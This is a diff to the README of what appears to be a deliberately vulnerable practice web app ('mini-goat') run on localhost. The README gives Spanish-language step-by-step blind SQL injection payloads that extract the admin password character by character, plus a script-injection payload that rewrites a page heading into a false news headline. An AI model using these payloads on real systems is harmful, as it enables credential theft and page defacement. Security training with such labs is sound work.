@@ -8,22 +8,22 @@ It's a web-app made with SpringMVC and Postgres. Should be easily setup.
 
 ## Injections
 
-    [http://localhost:8080/mini-goat/usuarios/listado.do?filtro=](http://localhost:8080/mini-goat/usuarios/listado.do?filtro=)
+[http://localhost:8080/mini-goat/usuarios/listado.do?filtro=](http://localhost:8080/mini-goat/usuarios/listado.do?filtro=)
 
-1. comprobamos que es un like:
+1.. comprobamos que es un like:
 
     a
     b
 
-2. verificamos que podemos obtener un verdadero distinguible
+2.. verificamos que podemos obtener un verdadero distinguible
 
     pipo' and '1' like '1
 
-3. verificamos que podemos obtener un falso distinguible
+3.. verificamos que podemos obtener un falso distinguible
 
     pipo' and '1' like '2
 
-4. verificamos que la tabla se llama "usuarios"
+4.. verificamos que la tabla se llama "usuarios"
 
     pipo' or exists (select 1 from usuarios) and '1' like '1
 
@@ -31,32 +31,32 @@ It's a web-app made with SpringMVC and Postgres. Should be easily setup.
 
     pipo' or exists (select 1 from usuario) and '1' like '1
 
-5. verificamos que hay un campo password
+5.. verificamos que hay un campo password
 
     pipo' or exists (select 1 from usuarios where password = password) and '1' like '1
 
-6. verificamos que existe efectivamente el usuario admin
+6.. verificamos que existe efectivamente el usuario admin
 
     pipo' or exists (select 1 from usuarios where password = password and username = 'admin') and '1' like '1
 
-7. vemos el largo de la contraseña
+7.. vemos el largo de la contraseña
 
-pipo' or exists (select 1 from usuarios where length(password) > 0 and username = 'admin') and '1' like '1
+    pipo' or exists (select 1 from usuarios where length(password) > 0 and username = 'admin') and '1' like '1
 
-8. vemos con qué letra empieza la contraseña
+8.. vemos con qué letra empieza la contraseña
 
-pipo' or exists (select 1 from usuarios where substring(password, 1, 1) < 'z' and username = 'admin') and '1' like '1
+    pipo' or exists (select 1 from usuarios where substring(password, 1, 1) < 'z' and username = 'admin') and '1' like '1
 
-9. vemos con qué letra sigue la contraseña
+9.. vemos con qué letra sigue la contraseña
 
-pipo' or exists (select 1 from usuarios where substring(password, 1, 1) = '1' and substring(password, 2, 1) < 'z' and username = 'admin') and '1' like '1
+    pipo' or exists (select 1 from usuarios where substring(password, 1, 1) = '1' and substring(password, 2, 1) < 'z' and username = 'admin') and '1' like '1
 
-10. así sucesivamente, hasta sacar todos los caracteres de la contraseña
+10.. así sucesivamente, hasta sacar todos los caracteres de la contraseña
 
-pipo' or exists (select 1 from usuarios where substring(password, 1, 1) = '1' and substring(password, 2, 1) = '2' and substring(password, 3, 1) = '3' and substring(password, 4, 1) = '4' and username = 'admin') and '1' like '1
+    pipo' or exists (select 1 from usuarios where substring(password, 1, 1) = '1' and substring(password, 2, 1) = '2' and substring(password, 3, 1) = '3' and substring(password, 4, 1) = '4' and username = 'admin') and '1' like '1
 
 ## XSS
 
-    [http://localhost:8080/mini-goat/noticias/leer.do?id=1](http://localhost:8080/mini-goat/noticias/leer.do?id=1)
+[http://localhost:8080/mini-goat/noticias/leer.do?id=1](http://localhost:8080/mini-goat/noticias/leer.do?id=1)
 
     <script>document.getElementsByTagName("h1")[0].innerHTML = "Obama perdonó la deuda con Argentina";</script>
